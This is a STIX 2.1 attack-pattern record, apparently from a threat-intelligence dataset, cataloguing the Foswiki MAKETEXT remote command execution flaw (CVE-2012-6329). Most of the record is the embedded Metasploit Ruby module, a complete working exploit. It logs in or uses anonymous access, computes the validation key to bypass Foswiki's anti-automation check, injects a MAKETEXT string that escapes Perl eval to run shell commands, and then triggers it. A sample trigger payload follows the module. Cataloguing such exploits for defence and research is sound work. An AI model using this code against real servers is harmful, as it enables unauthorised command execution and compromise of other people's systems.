{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1bfed336-515c-4810-bcc7-e3ec1049fad8",
    "created": "2024-08-14T17:12:32.260949Z",
    "modified": "2024-08-14T17:12:32.260953Z",
    "name": "Foswiki MAKETEXT Remote Command Execution",
    "description": " This module exploits a vulnerability in the MAKETEXT Foswiki variable. By using a specially crafted MAKETEXT, a malicious user can execute shell commands since the input is passed to the Perl \"eval\" command without first being sanitized. The problem is caused by an underlying security issue in the CPAN:Locale::Maketext module.  Only Foswiki sites that have user interface localization enabled (UserInterfaceInternationalisation variable set) are vulnerable.  If USERNAME and PASSWORD aren't provided, anonymous access will be tried. Also, if the FoswikiPage option isn't provided, the module will try to create a random page on the SandBox space. The modules has been tested successfully on Foswiki 1.1.5 as distributed with the official Foswiki-1.1.5-vmware image. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/foswiki_maketext.rb",
            "external_id": "foswiki_maketext.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-6329"
        },
        {
            "source_name": "reference",
            "url": "http://foswiki.org/Support/SecurityAlert-CVE-2012-6330"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Foswiki MAKETEXT Remote Command Execution',\n      'Description'    => %q{\n          This module exploits a vulnerability in the MAKETEXT Foswiki variable. By using\n        a specially crafted MAKETEXT, a malicious user can execute shell commands since the\n        input is passed to the Perl \"eval\" command without first being sanitized. The\n        problem is caused by an underlying security issue in the CPAN:Locale::Maketext\n        module.  Only Foswiki sites that have user interface localization enabled\n        (UserInterfaceInternationalisation variable set) are vulnerable.\n\n          If USERNAME and PASSWORD aren't provided, anonymous access will be tried.\n        Also, if the FoswikiPage option isn't provided, the module will try to create a\n        random page on the SandBox space. The modules has been tested successfully on\n        Foswiki 1.1.5 as distributed with the official Foswiki-1.1.5-vmware image.\n      },\n      'Author'         =>\n        [\n          'Brian Carlson', # original discovery in Perl Locale::Maketext\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2012-6329' ],\n          [ 'OSVDB', '88410' ],\n          [ 'URL', 'http://foswiki.org/Support/SecurityAlert-CVE-2012-6330' ]\n        ],\n      'Privileged'     => false, # web server context\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n          'Space'       => 1024,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic ruby python telnet'\n            }\n        },\n      'Platform'       => [ 'unix' ],\n      'Arch'           => ARCH_CMD,\n      'Targets'        => [[ 'Foswiki 1.1.5', { }]],\n      'DisclosureDate' => '2012-12-03',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [ true, \"Foswiki base path\", \"/\" ]),\n        OptString.new('FoswikiPage', [ false, \"Foswiki Page with edit permissions to inject the payload, by default random Page on Sandbox (Ex: /Sandbox/MsfTest)\" ]),\n        OptString.new('USERNAME', [ false,  \"The user to authenticate as (anonymous if username not provided)\"]),\n        OptString.new('PASSWORD', [ false,  \"The password to authenticate with (anonymous if password not provided)\" ])\n      ])\n  end\n\n  def post_auth?\n    true\n  end\n\n  def do_login(username, password)\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => \"#{@base}bin/login\",\n      'vars_post' =>\n        {\n          'username' => username,\n          'password' => password\n        }\n      })\n\n    if not res or res.code != 302 or res.get_cookies !~ /FOSWIKISID=([0-9a-f]*)/\n      vprint_status \"#{res.code}\\n#{res.body}\"\n      return nil\n    end\n\n    session = $1\n    return session\n  end\n\n  def inject_code(session, code)\n\n    vprint_status(\"Retrieving the validation_key...\")\n\n    res = send_request_cgi({\n      'uri'      => \"#{@base}bin/edit#{@page}\",\n      'cookie'   => \"FOSWIKISID=#{session}\"\n    })\n\n    if not res or res.code != 200 or res.body !~ /name='validation_key' value='\\?([0-9a-f]*)'/\n      vprint_error(\"Error retrieving the validation_key\")\n      return nil\n    end\n\n    validation_key = $1\n    vprint_good(\"validation_key found: #{validation_key}\")\n\n    if session.empty?\n      if res.get_cookies =~ /FOSWIKISID=([0-9a-f]*)/\n        session = $1\n      else\n        vprint_error(\"Error using anonymous access\")\n        return nil\n      end\n    end\n\n    if res.get_cookies =~ /FOSWIKISTRIKEONE=([0-9a-f]*)/\n      strike_one = $1\n    else\n      vprint_error(\"Error getting the FOSWIKISTRIKEONE value\")\n      return nil\n    end\n\n    # Transforming validation_key in order to bypass foswiki antiautomation\n    validation_key = Rex::Text.md5(validation_key + strike_one)\n    vprint_status(\"Transformed validation key: #{validation_key}\")\n    vprint_status(\"Injecting the payload...\")\n\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => \"#{@base}bin/save#{@page}\",\n      'cookie'   => \"FOSWIKISID=#{session}\",\n      'vars_post' =>\n      {\n        'validation_key' => validation_key,\n        'text' => \"#{rand_text_alpha(3 + rand(3))} %MAKETEXT{\\\"#{rand_text_alpha(3 + rand(3))} [_1] #{rand_text_alpha(3 + rand(3))}\\\\\\\\'}; `#{code}`; { #\\\" args=\\\"#{rand_text_alpha(3 + rand(3))}\\\"}%\"\n      }\n\n    })\n\n    if not res or res.code != 302 or res.headers['Location'] !~ /bin\\/view#{@page}/\n      print_warning(\"Error injecting the payload\")\n      print_status \"#{res.code}\\n#{res.body}\\n#{res.headers['Location']}\"\n      return nil\n    end\n\n    location = URI(res.headers['Location']).path\n    print_good(\"Payload injected on #{location}\")\n\n    return location\n  end\n\n  def check\n    @base = target_uri.path\n    @base << '/' if @base[-1, 1] != '/'\n\n    res = send_request_cgi({\n      'uri'      => \"#{@base}System/WebHome\"\n    })\n\n    if not res or res.code != 200\n      return Exploit::CheckCode::Unknown\n    end\n\n    if res.body =~ /This site is running Foswiki version.*Foswiki-(\\d\\.\\d\\.\\d)/\n      version = $1\n      print_status(\"Version found: #{version}\")\n      if version <= \"1.1.6\"\n        return Exploit::CheckCode::Appears\n      else\n        return Exploit::CheckCode::Detected\n      end\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n\n    # Init variables\n    @page = ''\n\n    if datastore['FoswikiPage'] and not datastore['FoswikiPage'].empty?\n      @page << '/' if datastore['FoswikiPage'][0] != '/'\n      @page << datastore['FoswikiPage']\n    else\n      @page << \"/Sandbox/#{rand_text_alpha_lower(3).capitalize}#{rand_text_alpha_lower(3).capitalize}\"\n    end\n\n    @base = target_uri.path\n    @base << '/' if @base[-1, 1] != '/'\n\n    # Login if needed\n    if (datastore['USERNAME'] and\n      not datastore['USERNAME'].empty? and\n      datastore['PASSWORD'] and\n      not datastore['PASSWORD'].empty?)\n      print_status(\"Trying login to get session ID...\")\n      session = do_login(datastore['USERNAME'], datastore['PASSWORD'])\n    else\n      print_status(\"Using anonymous access...\")\n      session = \"\"\n    end\n\n    if not session\n      fail_with(Failure::Unknown, \"Error getting a session ID\")\n    end\n\n    # Inject payload\n    print_status(\"Trying to inject the payload on #{@page}...\")\n    res = inject_code(session, payload.encoded)\n    if not res or res !~ /#{@page}/\n      fail_with(Failure::Unknown, \"Error injecting the payload\")\n    end\n\n    # Execute payload\n    print_status(\"Executing the payload through #{@page}...\")\n    res = send_request_cgi({\n      'uri'      => \"#{@base}#{@page}\",\n      'cookie'   => \"FOSWIKISID=#{session}\"\n    })\n    if not res or res.code != 200 or res.body !~ /HASH/\n      print_status(\"#{res.code}\\n#{res.body}\")\n      fail_with(Failure::Unknown, \"Error executing the payload\")\n    end\n\n    print_good(\"Exploitation was successful\")\n\n  end\nend\n\n=begin\n\n* Trigger:\n\n%MAKETEXT{\"test [_1] secondtest\\\\'}; `touch /tmp/msf.txt`; { #\" args=\"msf\"}%\n\n=end\n\n",
    "x_mitre_disclosure_date": "2012-12-03",
    "x_mitre_platforms": [
        "[ 'unix' ]"
    ]
}